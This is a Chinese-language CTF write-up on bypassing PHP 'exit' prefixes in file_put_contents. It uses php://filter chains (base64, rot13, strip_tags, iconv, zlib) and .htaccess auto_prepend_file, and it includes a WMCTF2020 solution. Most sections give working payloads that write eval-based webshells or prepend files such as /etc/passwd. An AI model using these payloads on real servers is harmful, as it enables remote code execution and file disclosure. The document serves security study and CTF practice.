[参考文章](https://xz.aliyun.com/news/7758)和参考wiki里的文章
死亡exit一般以三种形式出现
```
file_put_contents($filename,"<?php exit();".$content);
file_put_contents($content,"<?php exit();?>".$content);
file_put_contents($filename,$content."\nxxxxxx");
```
这里我们的思路一般是想要将杂糅或者死亡代码分解掉；这里思路基本上都是利用php伪协议filter，结合编码或者相应的过滤器进行绕过；其原理不外乎是将死亡或者杂糅代码分解成php无法识别的代码；
这一题`<?php exit();`为了不影响后面的payload，需要先闭合死亡代码。
# 两个输入可控

## base64编码绕过
base64只可以识别`[0-9a-zA-Z+=]`64种字符，`<?php exit;?>`会被识别为`phpexit`，解码以4byte一组。
因为`file_put_contents($filename,$content)`的`$filename`字段可以用`php://filter`过滤器。
所以可以
```php<?php
//PHP 7.0.33 Apache/2.4.25
error_reporting(0);
highlight_file(__FILE__);
if(isset($_GET['content']) && isset($_GET['filename'])) {
    $content = $_GET['content'];  
    $filename = $_GET['filename'];
    file_put_contents($filename,'<?php exit();'.$content);
    include($filename);
}
```

```
$filename=php://filter/convert.base64-decode/resource=666.php
$content=aPz48P3BocCBAZXZhbCgkX1BPU1RbJ2NtZCddKTtwaHBpbmZvKCk7Pz4=
```
之所以要用在base64加密的文字前加一个a，是因为`phpexit`有7个字符，补一个a是为了凑齐8个byte，base64是以4byte为单位解码的，这样不会影响到后面的木马的解码，最后666.php的文件内容是`phpexitaPz48P3BocCBAZXZhbCgkX1BPU1RbJ2NtZCddKTtwaHBpbmZvKCk7Pz4=`解码后是`�␦^�+Z?><?php @eval($_POST['cmd']);phpinfo();?>`这样`<?php exit;>`就消失不见了。前面的`?>`是必须要有的，不然出现解码后是`�␦^�+Z<?php @eval($_POST['cmd']);phpinfo();?`的情况，导致后面代码没有闭合，导致失效。
接下来可以直接访问666.php或者include文件。就可以了。
## rot13编码绕过
`<?php exit;?>`经过rot13解码后是`<?cuc rkvg;?>`这样就可以让让他失效了,与base64同理。
```
$filename=php://filter/write=string.rot13/resource=666.php
$content=?><?cuc @riny($_CBFG['pzq']);cucvasb();?>
```
但是只是这种方法有点尴尬的是；因为我们生成的文件内容之中前面的`<?`并没有分解掉，这时，如果服务器开启了短标签，那么就会被解析，所以所以后面的代码就会错误；也就失去了作用；
## .htaccess的预包含利用
利用.htaccess或者.user.ini的预包含文件的功能来进行攻破：
```PHP
$filename='php://filter/write=string.strip_tags/resource=.htaccess'
$content='?>php_value%20auto_prepend_file%20/flag' //这里的.htaccess内容视情
```
这里使用了一个string.strip_tags过滤器，可以过滤.htaccess内容里的html和php标签，从而消除了死亡代码；然后content变量就是用来写自己需要的payload，最后写入文件的就是content里面的内容。**这里就会存在上面所说的情况，如果给到的死亡代码没有闭合，content会和死亡exit一起被过滤。**
但是这种方法也是具有一定的局限性，首先我们需要知道flag文件的位置，和文件的名字，一般的比赛中可以盲猜 flag.php flag /flag /flag.php 等等；另外还有个很大的问题是，string.strip_tags过滤器只是可以在php5的环境下顺利的使用，如果题目环境是在php7.3.0以上的环境下，则会发生段错误。导致写不进去；根本来说是php7.3.0中废弃了string.strip_tags这个过滤器；
payload
```
?filename=php://filter/write=string.strip_tags/resource=.htaccess&content=?>php_value%20auto_prepend_file%20/flag
```
我把环境改为PHP`5.6`试了一下![](/image/257.png)
## iconv过滤器
### ucs-2编码
通过usc-2的编码进行转换；对目标字符串进行2位一反转；（因为是两位一反转，所以字符的数目需要保持在偶数位上）
例如:
```php
<?php
$test = iconv("UCS-2LE","UCS-2BE",'<?php eval($_POST[1]);phpinfo();?>');
echo $test;
$test = iconv("UCS-2LE","UCS-2BE",$test);
echo $test;
```
可以回显`?<hp pvela$(P_SO[T]1;)hpipfn(o;)>?<?php eval($_POST[1]);phpinfo();?>`
这样就可以把前面的字符打乱。
```
filename=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=777.php
content=a?<hp pvela$(P_SO[T]1;)hpipfn(o;)>?
```
### ucs-4编码
与上面同理，只不过是四位一反转。
```php
<?php
$test = iconv("UCS-4LE","UCS-4BE",'<?php eval($_POST[1]);phpinfo();?>66');
echo $test;
$test = iconv("UCS-4LE","UCS-4BE",$test);
echo $test;
```
会输出`hp?<ve p$(laSOP_]1[Thp;)fnip;)(o66>?<?php eval($_POST[1]);phpinfo();?>66`，之所以在最后添加66是为了凑够36个字符是四的倍数。
```
?filename=php://filter/write=convert.iconv.UCS-4LE.UCS-4BE/resource=888.php&content=aaahp?<ve p$(laSOP_]1[Thp;)fnip;)(o66>?
```
这个需要加`aaa`是因为前面的`<?php exit();`有13个字符，加三个a可以凑够四的倍数。
## utf7转utf8
`=`在被转化为utf-7编码的时候为`+AD0-`，而且`+AD0-`可以被`convert.base64-decode`过滤器解码，这就为base64编码绕过提供了一个新的组合用法：
```P
$content='php://filter/write=PD9waHANCmV2YWwoJF9QT1NUWzFdKTsNCj8+|convert.iconv.utf-8.utf-7|convert.base64-decode/resource=shell1.php'
```


## 组合技
### strip_tags配合base
过滤器组合拳，其实故名思意，就是利用过滤器嵌套过滤器进行过滤，以此达到代码的层层更迭，从而最后写入我们期望的代码；
使用strip_tags去除html和php标签内容，base64编码用来编码payload，由于payload部分被编码了，所以不会被strip_tags过滤。
```
?filename=php://filter/write=string.strip_tags|convert.base64-decode/resource=1.php&content=?>PD9waHAgcGhwaW5mbygpOz8+
```
利用string.strip_tags可以过滤掉html标签，将标签内的所有内容进行删去，然后再进行base64解码，成功写入shell；
但是不可以用php7
### 压缩配合小写转换
如果环境是PHP7.3.0，我们不能用上面那个方法，这个时候就可以考虑压缩配合小写转换的方法，这里用三个过滤器叠加之后先进行压缩，然后转小写，最后解压，会导致部分死亡代码错误；则可以写入shell：
```
filename=php://filter/zlib.deflate|string.tolower|zlib.inflate|/resource=666.php
content=php://filter/zlib.deflate|string.tolower|zlib.inflate|?><?php phpinfo();?>/resource=666.php
```
如果直接这样传入的话，最终写入的内容是`<?php@�xit();php://fil|mr/zlib.lmfla|m|s|ring.|olowmr|zlib.infla|m|?><?php@phpinfo();?>/re�e�e�e�e�e�e�e�e�e�e�e�e�e�e�e�e�e�e�e�e�e�e�e�e�e�e�e�e�e�e�e�e�e�e�e�e�e�e�e�e�e�e�e�=666.`
可以见`<?php@phpinfo();?>`多了一个`@`
所以要
```
filename=php://filter/zlib.deflate|string.tolower|zlib.inflate|/resource=s1mple.php&content=php://filter/zlib.deflate|string.tolower|zlib.inflate|?><?php%0dphpinfo();?>/resource=s1mple.php  #用%0d代替空格
```
使用这种方法最终得到的输出结果中，exit部分会存在部分乱码从而失效。
需要关闭短标签，否则会报`@`的错。
#### 例题
`[WMCTF2020]Web Check in 2.0`
```php
<?php  
//PHP 7.0.33 Apache/2.4.25  
error_reporting(0);  
$sandbox = '/var/www/html/sandbox/' . md5($_SERVER['REMOTE_ADDR']);  
@mkdir($sandbox);  
@chdir($sandbox);  
var_dump("Sandbox:".$sandbox);  
highlight_file(__FILE__);  
if(isset($_GET['content'])) {    
	$content = $_GET['content'];  
    if(preg_match('/iconv|UCS|UTF|rot|quoted|base64/i',$content))  
         die('hacker');  
    if(file_exists($content))  
        require_once($content);    
    file_put_contents($content,'<?php exit();'.$content);  
}
```
这个直接
```
?content=php://filter/zlib.deflate|string.tolower|zlib.inflate|?><?php%0deval($_GET[1]);?>/resource=123.php
```
再这样可以命令执行
```
?content=123.php&1=system('ls /');
```
但是执行一次后这个文件就消失了，需要重新传一遍shell。
# 一个变量可控
## Base64编码绕过
和上面一样，一个变量依然可以使用base64绕过，但是以下两种payload是不能用的：
```
$content='php://filter/convert.base64-decode/PD9waHAgcGhwaW5mbygpOz8+/resource=shell1.php'
$content='php://filter/convert.base64-decode/resource=PD9waHAgcGhwaW5mbygpOz8+.php'
```
看似payload写在过滤器处或者是文件名处，应该是可以使用的。但是实际使用的时候，会发现写不进去，原因就是在base64中，`=`是用来占位的，也是结束的标志，内容中出现等号(比如resource=)，导致无法正常解码，文件可以生成，但是因为解码不成功导致无法写入内容。
只要去除等号我们就可以正常使用base64编码的方式绕过exit，这个时候就又可以使用过滤器来实现这一目的了：
这里还要分两种情况考虑；
### exit没有被闭合

```
$content='php://filter/string.strip_tags|convert.base64-decode/resource=?>PD9waHANCmV2YWwoJF9QT1NUWzFdKTsNCj8%2B.php'
```
使用上述payload会导致文件名是base64的payload，非常长不好利用，文件名里还有符号，不好cat
```
$content='php://filter/string.strip_tags|convert.base64-decode/resource=?>PD9waHANCmV2YWwoJF9QT1NUWzFdKTsNCj8%2B/../shell.php'
```
将base64的结果当作一个目录，并在上一个目录也就是实际需要写文件的目录下写一个webshell文件(这个base64结果的目录不一定真正的存在)。
需要注意的是，这种方法在Windows下不可行，有以下两种原因：
1.Windows文件不允许存在问号和尖括号，所以如果是payload前利用`?>`闭合，生成文件的文件名前就会存在非法字符，从而生成文件失败，也就写不了文件。
2.如果payload前没有被过滤，那么这个方法就失去原本的意义(去掉resource后的等号)，文件可以生成但是无法写入payload(等号后面的payload无法被正常解码)。
### exit闭合
如果exit在file_put_contents中已经被闭合了，使用上面的payload是写入不了的，原因是resource后面用来闭合的`?>`没有被过滤器过滤，而尖括号和问号不是base64的合法字符，所以会导致解码的时候出现问题，这个时候就要考虑换一种payload的写法，其实很简单，直接把base64过程中遇到的`=`写在`<? ?>`中，利用过滤器全部过滤，就可以绕过了：
```
$content='php://filter/<?|string.strip_tags|convert.base64-decode/resource=?>PD9waHANCmV2YWwoJF9QT1NUWzFdKTsNCj8%2B/../shell.php'
```
## rot13编码绕过
```
content=php://filter/write=string.rot13|<?cuc @riny($_CBFG['pzq']);cucvasb();?>|/resource=shell.php
```
依然是开了短标签没办法使用
## iconv编码器
### ucs-2编码
```
filename=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE|?<hp pvela$(P_SO[T]1;)hpipfn(o;)>?|/resource=shell.php
```
道理同上。
### ucs-4编码
```
php://filter/write=convert.iconv.UCS-4LE.UCS-4BE|aaahp?<ve p$(laSOP_]1[Thp;)fnip;)(o66>?|/resource=shell.php
```

## 写入配置文件
```
filename=php://filter/write=string.strip_tags|?>php_value%20auto_prepend_file%20/etc/passwd%0a%23/resource=.htaccess
```
依然是猜路径。利用 `%0a` 进行换行 `#` 注释后面的杂糅代码。
只适用于exit未闭合的情况，因为.htaccess对编排比较敏感，有一点错都不行，如果应用在exit闭合的情况，会把前面伪协议的部分也写进去导致.htaccess中内容无法执行。
# 存在杂糅代码
我们只需要让后面的杂糅代码注释掉，或者分解掉都是可以的，目的就是不让杂糅代码干扰；针对 php 而言，拥有特殊的起始符和结束符，如果可以写入 php 代码的话，就可以轻易的绕过后面的杂糅代码。正常写入payload即可，比如`<?php eval($_POST['hack']);?>`，识别到`?>`自动结束，也就不会受到杂糅代码的影响。
常见的考点是利用.htaccess进行操作；.htaccess文件对其文件内容的格式很敏感，如果有杂糅的字符，就会出现错误，导致我们无法进行操作，所以这里我们必须采用注释符将杂糅的代码进行注释，然后才可以正常访问；
例如
```php
<?php //PHP 7.0.33 Apache/2.4.25 
error_reporting(0); 
highlight_file(__FILE__);   
if(isset($_GET['content']) && isset($_GET['filename'])) {     
	$content = $_GET['content'];      
	$filename = $_GET['filename'];    
file_put_contents($filename,$content.'\nxxxxxx');   
    include($filename);  
}
```

```
?filename=.htaccess&content=php_value auto_prepend_file /flag %0a%23\
```
这里的`%0a%23`用来换行并注释杂糅代码，`\`用来转义`\n`使其也被注释，确保`.htaccess`的编排不会出错，出错的后果就无法执行。

## 参考文章
- https://xz.aliyun.com/news/7758
- wiki里的相关文章